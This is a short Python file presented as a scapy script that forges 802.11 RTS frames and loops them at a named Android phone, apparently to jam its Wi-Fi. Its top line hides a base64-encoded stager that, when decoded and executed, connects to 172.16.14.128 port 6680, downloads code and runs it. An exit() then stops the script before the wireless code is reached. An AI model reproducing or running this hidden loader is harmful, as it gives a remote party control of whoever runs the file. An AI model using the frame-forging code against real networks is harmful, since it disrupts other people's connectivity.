#!/usr/bin/python

import base64,sys;exec(base64.b64decode({2:str,3:lambda b:bytes(b,'UTF-8')}[sys.version_info[0]]('aW1wb3J0IHNvY2tldCxzdHJ1Y3QsdGltZQpmb3IgeCBpbiByYW5nZSgxMCk6Cgl0cnk6CgkJcz1zb2NrZXQuc29ja2V0KDIsc29ja2V0LlNPQ0tfU1RSRUFNKQoJCXMuY29ubmVjdCgoJzE3Mi4xNi4xNC4xMjgnLDY2ODApKQoJCWJyZWFrCglleGNlcHQ6CgkJdGltZS5zbGVlcCg1KQpsPXN0cnVjdC51bnBhY2soJz5JJyxzLnJlY3YoNCkpWzBdCmQ9cy5yZWN2KGwpCndoaWxlIGxlbihkKTxsOgoJZCs9cy5yZWN2KGwtbGVuKGQpKQpleGVjKGQseydzJzpzfSkK')))
exit()

from scapy.all import Dot11, RadioTap, sendp, hexdump
import struct

INTERFACE = 'wlan0mon'
CONTROL = 1
RTS_SUBTYPE = 11
CTS_SUBTYPE = 12

TARGET_STATION = 'f0:25:b7:ea:3c:2e' # Android phone
SRC_ADDR = '22:22:22:22:22:22'

def forgedRTS():
    millis = 615
    blob = struct.pack( "<H", millis )
    millis = struct.unpack( ">H", blob )[0]

    dot11 = Dot11(
			addr1 = TARGET_STATION,
			addr2 = SRC_ADDR,
        	type = CONTROL,
			subtype = RTS_SUBTYPE,
			ID = millis )

    return  RadioTap() / dot11


frame = forgedRTS()

frame.show()
hexdump( frame )

sendp( frame, iface = INTERFACE, inter = 0.1, loop = 1 )
